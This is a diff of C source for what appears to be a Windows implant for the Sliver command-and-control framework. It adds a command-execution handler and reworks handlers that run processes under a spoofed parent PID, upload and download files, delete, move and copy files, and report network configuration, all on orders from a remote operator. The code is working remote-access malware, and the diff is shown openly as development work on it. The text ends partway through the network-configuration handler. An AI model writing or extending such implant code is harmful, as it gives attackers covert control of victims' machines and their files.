@@ -34,7 +34,7 @@ PENVELOPE CdHandler
 	DWORD dwNumberOfBytesRead = 0;
 	PBUFFER* pTemp = NULL;
 	LPSTR lpRespData = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	LPSTR lpNewPath = NULL;
 	DWORD dwReturnedLength = 0;
 
@@ -62,9 +62,9 @@ PENVELOPE CdHandler
 
 	FreeElement(pElement);
 	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
 	pElement->pMarshaledData = NULL;
 CLEANUP:
 	if (pTemp != NULL) {
@@ -76,7 +76,104 @@ CLEANUP:
 	FREE(lpRespData);
 	FreeElement(pElement);
 
-	return pRespEnvelope;
+	return pResult;
+}
+
+PENVELOPE CmdHandler
+(
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID lpSliverClient
+)
+{
+	PPBElement pCmdElements[2];
+	PPBElement pRespElements[2];
+	DWORD i = 0;
+	PENVELOPE pResult = NULL;
+	LPVOID* UnmarshaledData = NULL;
+	LPSTR lpCommand = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
+	PGLOBAL_CONFIG pConfig = NULL;
+	PBYTE pHashValue = NULL;
+	LPWSTR lpMutexName = NULL;
+	LPWSTR lpInputPath = NULL;
+	LPWSTR lpErrorPath = NULL;
+	LPWSTR lpOutputPath = NULL;
+	UINT64 uTimeout = 0;
+	PBYTE pOutputData = NULL;
+	DWORD cbOutputData = NULL;
+	PBYTE pErrorData = NULL;
+	DWORD cbErrorData = NULL;
+
+	for (i = 0; i < _countof(pCmdElements); i++) {
+		pCmdElements[i] = ALLOC(sizeof(PBElement));
+		pCmdElements[i]->dwFieldIdx = i + 1;
+	}
+	
+	pCmdElements[0]->Type = Bytes;
+	pCmdElements[1]->Type = Varint;
+	UnmarshaledData = UnmarshalStruct(pCmdElements, _countof(pCmdElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	uTimeout = *(PUINT64)UnmarshaledData[1];
+	lpCommand = DuplicateStrA(((PBUFFER)UnmarshaledData[0])->pBuffer, 0);
+	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
+	pConfig = pSession->pGlobalConfig;
+	pHashValue = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
+	lpMutexName = ConvertBytesToHexW(pHashValue, 8);
+	lpInputPath = DuplicateStrW(pConfig->lpScriptPath, 0);
+	lpInputPath = StrCatExW(lpInputPath, L"\\");
+	lpInputPath = StrCatExW(lpInputPath, lpMutexName);
+
+	lpErrorPath = DuplicateStrW(lpInputPath, 4);
+	lpOutputPath = DuplicateStrW(lpInputPath, 4);
+	lstrcatW(lpErrorPath, L".err");
+	lstrcatW(lpOutputPath, L".out");
+	lpInputPath = StrCatExW(lpInputPath, L".in");
+	if (!WriteToFile(lpInputPath, lpCommand, lstrlenA(lpCommand))) {
+		goto CLEANUP;
+	}
+
+	for (i = 0; i < uTimeout; i++) {
+		if (IsFileExist(lpOutputPath)) {
+			pOutputData = ReadFromFile(lpOutputPath, &cbOutputData);
+			if (cbOutputData > 0) {
+				pRespElements[0] = CreateBytesElement(pOutputData, cbOutputData, 1);
+			}
+
+			if (IsFileExist(lpErrorPath)) {
+				pErrorData = ReadFromFile(lpErrorPath, &cbErrorData);
+				if (cbErrorData > 0) {
+					pRespElements[1] = CreateBytesElement(pErrorData, cbErrorData, 2);
+				}
+			}
+			break;
+		}
+
+		Sleep(1000);
+	}
+
+CLEANUP:
+	for (i = 0; i < _countof(pCmdElements); i++) {
+		FREE(pCmdElements[i]);
+	}
+
+	if (UnmarshaledData != NULL) {
+		FreeBuffer(UnmarshaledData[0]);
+		FREE(UnmarshaledData);
+	}
+
+	FREE(lpCommand);
+	FREE(pHashValue);
+	FREE(lpMutexName);
+	FREE(lpInputPath);
+	FREE(lpOutputPath);
+	FREE(lpErrorPath);
+	FREE(pOutputData);
+	FREE(pErrorData);
+
+	return pResult;
 }
 
 PENVELOPE ExecuteHandler
@@ -84,14 +181,13 @@ PENVELOPE ExecuteHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[6];
 	PPBElement RespElementList[4];
 	PPBElement pFinalElement = NULL;
 	LPVOID* UnmarshaledData = NULL;
 	LPSTR lpStdOutPath = NULL;
 	LPSTR lpStdErrPath = NULL;
-	LPSTR lpPath = NULL;
 	DWORD i = 0;
 	DWORD dwArgc = 0;
 	BOOL Output = FALSE;
@@ -112,6 +208,9 @@ PENVELOPE ExecuteHandler
 	SECURITY_ATTRIBUTES SecurityAttributes;
 
 	SecureZeroMemory(RecvElementList, sizeof(RecvElementList));
+	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
+	SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
+	SecureZeroMemory(RespElementList, sizeof(RespElementList));
 	for (i = 0; i < _countof(RecvElementList); i++) {
 		RecvElementList[i] = ALLOC(sizeof(PBElement));
 		RecvElementList[i]->dwFieldIdx = i + 1;
@@ -129,29 +228,30 @@ PENVELOPE ExecuteHandler
 		goto CLEANUP;
 	}
 
-	lpPath = GetFullPathA(((PBUFFER)(UnmarshaledData[0]))->pBuffer);
+	lpCommandLine = DuplicateStrA(((PBUFFER)(UnmarshaledData[0]))->pBuffer, 1);
 	if (UnmarshaledData[3] != NULL) {
-		lpStdOutPath = GetFullPathA(((PBUFFER)(UnmarshaledData[3]))->pBuffer);
+		lpStdOutPath = DuplicateStrA(((PBUFFER)(UnmarshaledData[3]))->pBuffer, 0);
 	}
 
 	if (UnmarshaledData[4] != NULL) {
-		lpStdErrPath = GetFullPathA(((PBUFFER)(UnmarshaledData[4]))->pBuffer);
+		lpStdErrPath = DuplicateStrA(((PBUFFER)(UnmarshaledData[4]))->pBuffer, 0);
 	}
 
-	lpCommandLine = DuplicateStrA(lpPath, 1);
+	if (lpStdOutPath != NULL && lpStdErrPath != NULL && !lstrcmpA(lpStdErrPath, lpStdOutPath)) {
+		goto CLEANUP;
+	}
+
 	if (UnmarshaledData[1] != NULL) {
 		lstrcatA(lpCommandLine, " ");
 		dwArgc = *(PDWORD)(UnmarshaledData[1]);
 		for (i = 0; i < dwArgc; i++) {
-			lpCommandLine = StrCatExA(lpCommandLine, ((PBUFFER*)(UnmarshaledData[1]))[i]->pBuffer);
+			lpCommandLine = StrCatExA(lpCommandLine, ((PBUFFER*)(UnmarshaledData[1]))[i + 1]->pBuffer);
 			lpCommandLine = StrCatExA(lpCommandLine, " ");
 		}
 	}
 
 	Output = (BOOL)UnmarshaledData[2];
 	dwParentPid = (DWORD)UnmarshaledData[5];
-	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
-	SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
 	if (dwParentPid > 0) {
 		hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPid);
 		if (hParentProcess == NULL) {
@@ -186,18 +286,13 @@ PENVELOPE ExecuteHandler
 		}
 
 		StartupInfo.StartupInfo.hStdOutput = hStdOut;
-		if (!lstrcmpA(lpStdOutPath, lpStdErrPath) && UnmarshaledData[3] != NULL && UnmarshaledData[4] != NULL) {
-			StartupInfo.StartupInfo.hStdError = hStdOut;
+		hStdErr = CreateFileA(lpStdErrPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hStdErr == INVALID_HANDLE_VALUE) {
+			LOG_ERROR("CreateFileA", GetLastError());
+			goto CLEANUP;
 		}
-		else {
-			hStdErr = CreateFileA(lpStdErrPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-			if (hStdErr == INVALID_HANDLE_VALUE) {
-				LOG_ERROR("CreateFileA", GetLastError());
-				goto CLEANUP;
-			}
 
-			StartupInfo.StartupInfo.hStdError = hStdErr;
-		}
+		StartupInfo.StartupInfo.hStdError = hStdErr;
 	}
 
 	StartupInfo.StartupInfo.cb = sizeof(StartupInfo);
@@ -206,27 +301,27 @@ PENVELOPE ExecuteHandler
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(RespElementList, sizeof(RespElementList));
 	RespElementList[3] = CreateVarIntElement(GetProcessId(ProcessInfo.hProcess), 4);
 	if (Output) {
 		WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
 		CloseHandle(hStdOut);
 		hStdOut = INVALID_HANDLE_VALUE;
+		lpTempPath = ConvertCharToWchar(lpStdOutPath);
+		pOutputBuffer = ReadFromFile(lpTempPath, &cbOutputBuffer);
+		RespElementList[1] = CreateBytesElement(pOutputBuffer, cbOutputBuffer, 2);
+		FREE(lpTempPath);
+
 		if (UnmarshaledData[3] == NULL) {
-			lpTempPath = ConvertCharToWchar(lpStdOutPath);
-			pOutputBuffer = ReadFromFile(lpTempPath, &cbOutputBuffer);
-			RespElementList[1] = CreateBytesElement(pOutputBuffer, cbOutputBuffer, 2);
-			FREE(lpTempPath);
 			DeleteFileA(lpStdOutPath);
 		}
 		
 		CloseHandle(hStdErr);
 		hStdErr = INVALID_HANDLE_VALUE;
+		lpTempPath = ConvertCharToWchar(lpStdErrPath);
+		pErrorBuffer = ReadFromFile(lpTempPath, &cbErrorBuffer);
+		RespElementList[2] = CreateBytesElement(pErrorBuffer, cbErrorBuffer, 3);
+		FREE(lpTempPath);
 		if (UnmarshaledData[4] == NULL) {
-			lpTempPath = ConvertCharToWchar(lpStdErrPath);
-			pErrorBuffer = ReadFromFile(lpTempPath, &cbErrorBuffer);
-			RespElementList[2] = CreateBytesElement(pErrorBuffer, cbErrorBuffer, 3);
-			FREE(lpTempPath);
 			DeleteFileA(lpStdErrPath);
 		}
 
@@ -235,9 +330,9 @@ PENVELOPE ExecuteHandler
 	}
 
 	pFinalElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (ProcessInfo.hThread != NULL) {
@@ -265,7 +360,6 @@ CLEANUP:
 
 	FREE(pOutputBuffer);
 	FREE(pErrorBuffer);
-	FREE(lpPath);
 	FREE(lpCommandLine);
 	FREE(lpStdOutPath);
 	FREE(lpStdErrPath);
@@ -283,7 +377,7 @@ CLEANUP:
 	}
 
 	FreeElement(pFinalElement);
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE UploadHandler
@@ -291,7 +385,7 @@ PENVELOPE UploadHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement RecvElementList[4];
 	LPVOID* UnmarshaledData = NULL;
 	LPSTR lpPath = NULL;
@@ -302,7 +396,6 @@ PENVELOPE UploadHandler
 	BOOL IsDirectory = FALSE;
 	LPSTR lpFileName = NULL;
 
-	SecureZeroMemory(RecvElementList, sizeof(RecvElementList));
 	for (i = 0; i < _countof(RecvElementList); i++) {
 		RecvElementList[i] = ALLOC(sizeof(PBElement));
 		RecvElementList[i]->dwFieldIdx = i + 1;
@@ -311,22 +404,15 @@ PENVELOPE UploadHandler
 
 	RecvElementList[3]->Type = Varint;
 	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
-	if (UnmarshaledData == NULL) {
+	if (UnmarshaledData == NULL || UnmarshaledData[1] == NULL || UnmarshaledData[0] == NULL) {
 		goto CLEANUP;
 	}
-
-	if (UnmarshaledData[0] != NULL) {
-		lpPath = DuplicateStrA(((PBUFFER*)UnmarshaledData)[0]->pBuffer, 0);
-		lpTempStr = ConvertCharToWchar(lpPath);
-		if (!IsFolderExist(lpTempStr)) {
-			LogError(L"Folder %s is not exist", lpTempStr);
-			goto CLEANUP;
-		}
-	}
-	else {
-		lpPath = ALLOC(MAX_PATH);
-		GetCurrentDirectoryA(MAX_PATH, lpPath);
-		lpTempStr = ConvertCharToWchar(lpPath);
+	
+	lpPath = DuplicateStrA(((PBUFFER*)UnmarshaledData)[0]->pBuffer, 0);
+	lpTempStr = ConvertCharToWchar(lpPath);
+	if (!IsFolderExist(lpTempStr)) {
+		LogError(L"Folder %s is not exist", lpTempStr);
+		goto CLEANUP;
 	}
 
 	if (UnmarshaledData[2] != NULL) {
@@ -339,9 +425,9 @@ PENVELOPE UploadHandler
 	}
 
 	UnmarshaledData[1] = NULL;
-	IsDirectory = ((PBOOL)UnmarshaledData)[3];
+	IsDirectory = (BOOL)UnmarshaledData[3];
 	if (IsDirectory) {
-		GenerateTempPathW(NULL, L".zip", NULL, &lpZipPath);
+		GenerateTempPathW(NULL, L".tar", NULL, &lpZipPath);
 		if (!WriteToFile(lpZipPath, pData->pBuffer, pData->cbBuffer)) {
 			goto CLEANUP;
 		}
@@ -360,8 +446,8 @@ PENVELOPE UploadHandler
 		}
 	}
 
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
 		FreeBuffer((PBUFFER)UnmarshaledData[0]);
@@ -372,15 +458,16 @@ CLEANUP:
 	}
 
 	for (i = 0; i < _countof(RecvElementList); i++) {
-		FreeElement(RecvElementList[i]);
+		FREE(RecvElementList[i]);
 	}
 
 	FREE(lpPath);
 	FREE(lpTempStr);
 	FREE(lpZipPath);
+	FREE(lpFileName);
 	FreeBuffer(pData);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE DownloadHandler
@@ -388,8 +475,8 @@ PENVELOPE DownloadHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
-	PPBElement pRecvElement = NULL;
+	PENVELOPE pResult = NULL;
+	PPBElement RecvElement[2];
 	PPBElement pRespElement[2];
 	PPBElement pFinalElement = NULL;
 	LPVOID* UnmarshaledData = NULL;
@@ -399,16 +486,22 @@ PENVELOPE DownloadHandler
 	LPWSTR lpTempStr = NULL;
 	LPWSTR lpZipPath = NULL;
 	BOOL IsDirectory = FALSE;
+	BOOL Compress = FALSE;
 
-	pRecvElement = ALLOC(sizeof(PBElement));
-	pRecvElement->dwFieldIdx = i + 1;
-	pRecvElement->Type = Bytes;
-	UnmarshaledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	for (i = 0; i < _countof(RecvElement); i++) {
+		RecvElement[i] = ALLOC(sizeof(PBElement));
+		RecvElement[i]->dwFieldIdx = i + 1;
+	}
+
+	RecvElement[0]->Type = Bytes;
+	RecvElement[1]->Type = Varint;
+	UnmarshaledData = UnmarshalStruct(RecvElement, _countof(RecvElement), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
 	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
 		goto CLEANUP;
 	}
 
 	lpPath = DuplicateStrA(((PBUFFER*)UnmarshaledData)[0]->pBuffer, 0);
+	Compress = (BOOL)UnmarshaledData[1];
 	lpTempStr = ConvertCharToWchar(lpPath);
 	if (!IsPathExist(lpTempStr)) {
 		LogError(L"%s is not exist", lpTempStr);
@@ -419,22 +512,32 @@ PENVELOPE DownloadHandler
 		IsDirectory = TRUE;
 	}
 
-	GenerateTempPathW(NULL, L".tar.gz", NULL, &lpZipPath);
-	CompressPathByGzip(lpTempStr, lpZipPath);
+	GenerateTempPathW(NULL, L".tar", NULL, &lpZipPath);
 	pData = ALLOC(sizeof(BUFFER));
-	pData->pBuffer = ReadFromFile(lpZipPath, &pData->cbBuffer);
+	if (IsDirectory || Compress) {
+		CompressPathByGzip(lpTempStr, lpZipPath);
+		if (!IsFileExist(lpZipPath)) {
+			goto CLEANUP;
+		}
+
+		pData->pBuffer = ReadFromFile(lpZipPath, &pData->cbBuffer);
+		DeleteFileW(lpZipPath);
+	}
+	else {
+		pData->pBuffer = ReadFromFile(lpTempStr, &pData->cbBuffer);
+	}
+	
 	if (pData->pBuffer == NULL || pData->cbBuffer == 0) {
 		goto CLEANUP;
 	}
 
-	DeleteFileW(lpZipPath);
 	pRespElement[0] = CreateBytesElement(pData->pBuffer, pData->cbBuffer, 1);
 	pRespElement[1] = CreateVarIntElement(IsDirectory, 2);
 
 	pFinalElement = CreateStructElement(pRespElement, _countof(pRespElement), 0);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (UnmarshaledData != NULL) {
@@ -442,14 +545,17 @@ CLEANUP:
 		FREE(UnmarshaledData);
 	}
 
+	for (i = 0; i < _countof(RecvElement); i++) {
+		FREE(RecvElement[i]);
+	}
+
 	FREE(lpPath);
 	FREE(lpTempStr);
 	FREE(lpZipPath);
-	FreeElement(pRecvElement);
 	FreeElement(pFinalElement);
 	FreeBuffer(pData);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE MkdirHandler
@@ -460,7 +566,7 @@ PENVELOPE MkdirHandler
 	PPBElement pElement = NULL;
 	DWORD dwNumberOfBytesRead = 0;
 	PBUFFER* pTemp = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD dwReturnedLength = 0;
 	LPWSTR lpPath = NULL;
 	DWORD dwErrorCode = ERROR_SUCCESS;
@@ -483,9 +589,9 @@ PENVELOPE MkdirHandler
 
 	FreeElement(pElement);
 	pElement = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
 	pElement->pMarshaledData = NULL;
 CLEANUP:
 	if (pTemp != NULL) {
@@ -495,7 +601,7 @@ CLEANUP:
 
 	FREE(lpPath);
 	FreeElement(pElement);
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE PingHandler
@@ -507,7 +613,7 @@ PENVELOPE PingHandler
 	PPBElement pFinalElement = NULL;
 	DWORD dwNumberOfBytesRead = 0;
 	PUINT64 UnmarshaledData = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD dwReturnedLength = 0;
 	UINT64 uNonce = 0;
 
@@ -518,16 +624,16 @@ PENVELOPE PingHandler
 	uNonce = UnmarshaledData[0];
 
 	pFinalElement = CreateVarIntElement(uNonce, 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 	pFinalElement->cbMarshaledData = 0;
 
 	FreeElement(pRecvElement);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE RmHandler
@@ -539,7 +645,7 @@ PENVELOPE RmHandler
 	PPBElement RespElement;
 	PBUFFER* pTemp = NULL;
 	LPSTR lpRespData = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD i = 0;
 	BOOL Force = FALSE;
 	BOOL Recursive = FALSE;
@@ -577,9 +683,9 @@ PENVELOPE RmHandler
 
 	lpRespData = DuplicateStrA(pTemp[0]->pBuffer, 0);
 	RespElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(RespElement->pMarshaledData, RespElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(RespElement->pMarshaledData, RespElement->cbMarshaledData);
 	RespElement->pMarshaledData = NULL;
 CLEANUP:
 	FREE(ShFileStruct.pFrom);
@@ -595,7 +701,7 @@ CLEANUP:
 	}
 
 	FreeElement(RespElement);
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE MvHandler
@@ -605,7 +711,7 @@ PENVELOPE MvHandler
 {
 	PPBElement Element[2];
 	PBUFFER* pTemp = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD i = 0;
 	LPWSTR lpSrc = NULL;
 	LPWSTR lpDest = NULL;
@@ -615,11 +721,14 @@ PENVELOPE MvHandler
 	for (i = 0; i < _countof(Element); i++) {
 		Element[i] = ALLOC(sizeof(PBElement));
 		Element[i]->dwFieldIdx = i + 1;
+		Element[i]->Type = Bytes;
 	}
 
-	Element[0]->Type = Bytes;
-	Element[1]->Type = Bytes;
 	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pTemp == NULL || pTemp[0] == NULL || pTemp[1] == NULL) {
+		goto CLEANUP;
+	}
+
 	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
 	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);
 
@@ -634,8 +743,8 @@ PENVELOPE MvHandler
 		goto CLEANUP;
 	}
 
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
 CLEANUP:
 	FREE(ShFileStruct.pFrom);
 	FREE(ShFileStruct.pTo);
@@ -648,10 +757,10 @@ CLEANUP:
 	FREE(lpSrc);
 	FREE(lpDest);
 	for (i = 0; i < _countof(Element); i++) {
-		FreeElement(Element[i]);
+		FREE(Element[i]);
 	}
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE CpHandler
@@ -663,7 +772,7 @@ PENVELOPE CpHandler
 	PPBElement RespElementList[3];
 	PPBElement RespElement = NULL;
 	PBUFFER* pTemp = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD i = 0;
 	LPWSTR lpSrc = NULL;
 	LPWSTR lpDest = NULL;
@@ -697,9 +806,9 @@ PENVELOPE CpHandler
 	RespElementList[2] = CreateVarIntElement(GetFileSizeByPath(lpSrc), 3);
 	RespElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);
 
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(RespElement->pMarshaledData, RespElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(RespElement->pMarshaledData, RespElement->cbMarshaledData);
 	RespElement->pMarshaledData = NULL;
 CLEANUP:
 	FREE(ShFileStruct.pFrom);
@@ -718,7 +827,7 @@ CLEANUP:
 
 	FreeElement(RespElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE PwdHandler
@@ -729,7 +838,7 @@ PENVELOPE PwdHandler
 	PPBElement pElement = NULL;
 	LPSTR lpRespData = NULL;
 	DWORD dwReturnedLength = 0;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 
 	lpRespData = ALLOC(MAX_PATH);
 	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
@@ -739,15 +848,15 @@ PENVELOPE PwdHandler
 	}
 
 	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
 	pElement->pMarshaledData = NULL;
 CLEANUP:
 	FREE(lpRespData);
 	FreeElement(pElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE IfconfigHandler
@@ -771,7 +880,7 @@ PENVELOPE IfconfigHandler
 	ULONG uMask = 0;
 	LPSTR lpHostName = NULL;
 	LPSTR lpPrimaryDnsSuffix = NULL;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PFIXED_INFO pFixedInfo = NULL;
 	DWORD cbFixedInfo = sizeof(FIXED_INFO);
 	DWORD dwLastError = 0;
@@ -802,19 +911,21 @@ PENVELOPE IfconfigHandler
 		}
 	}
 
-	if (pFixedInfo->NodeType == BROADCAST_NODETYPE) {
-		lpNodeType = DuplicateStrA("Broadcast", 0);
+	if (pFixedInfo != NULL) {
+		if (pFixedInfo->NodeType == BROADCAST_NODETYPE) {
+			lpNodeType = DuplicateStrA("Broadcast", 0);
+		}
+		else if (pFixedInfo->NodeType == PEER_TO_PEER_NODETYPE) {
+			lpNodeType = DuplicateStrA("Peer to peer", 0);
+		}
+		else if (pFixedInfo->NodeType == MIXED_NODETYPE) {
+			lpNodeType = DuplicateStrA("Mixed", 0);
+		}
+		else if (pFixedInfo->NodeType == HYBRID_NODETYPE) {
+			lpNodeType = DuplicateStrA("Hybrid", 0);
+		}
 	}
-	else if (pFixedInfo->NodeType == PEER_TO_PEER_NODETYPE) {
-		lpNodeType = DuplicateStrA("Peer to peer", 0);
-	}
-	else if (pFixedInfo->NodeType == MIXED_NODETYPE) {
-		lpNodeType = DuplicateStrA("Mixed", 0);
-	}
-	else if (pFixedInfo->NodeType == HYBRID_NODETYPE) {
-		lpNodeType = DuplicateStrA("Hybrid", 0);
-	}
-
+	
 	pAdapterInfo = ALLOC(cbAdapterInfo);
 	pTemp = pAdapterInfo;
 	dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
@@ -842,19 +953,23 @@ PENVELOPE IfconfigHandler
 	}
 
 	lpRespData = StrCatExA(lpRespData, "\n   IP Routing Enabled. . . . . . . . : ");
-	if (pFixedInfo->EnableRouting) {
-		lpRespData = StrCatExA(lpRespData, "yes");
+	if (pFixedInfo != NULL) {
+		if (pFixedInfo->EnableRouting) {
+			lpRespData = StrCatExA(lpRespData, "yes");
+		}
+		else {
+			lpRespData = StrCatExA(lpRespData, "no");
+		}
 	}
-	else {
-		lpRespData = StrCatExA(lpRespData, "no");
-	}
-
+	
 	lpRespData = StrCatExA(lpRespData, "\n   WINS Proxy Enabled. . . . . . . . : ");
-	if (pFixedInfo->EnableProxy) {
-		lpRespData = StrCatExA(lpRespData, "yes");
-	}
-	else {
-		lpRespData = StrCatExA(lpRespData, "no");
+	if (pFixedInfo != NULL) {
+		if (pFixedInfo->EnableProxy) {
+			lpRespData = StrCatExA(lpRespData, "yes");
+		}
+		else {
+			lpRespData = StrCatExA(lpRespData, "no");
+		}
 	}
 
 	while (TRUE) {
@@ -928,6 +1043,7 @@ PENVELOPE IfconfigHandler
 				if (ConvertLengthToIpv4Mask(pAdapterUnicastAddr->OnLinkPrefixLength, &uMask) == STATUS_SUCCESS) {
 					SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
 					wsprintfA(szTempBuffer, "/%d", uMask);
+					lpRespData = StrCatExA(lpRespData, szTempBuffer);
 				}
 			}
 
@@ -990,9 +1106,9 @@ PENVELOPE IfconfigHandler
 	}
 
 	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
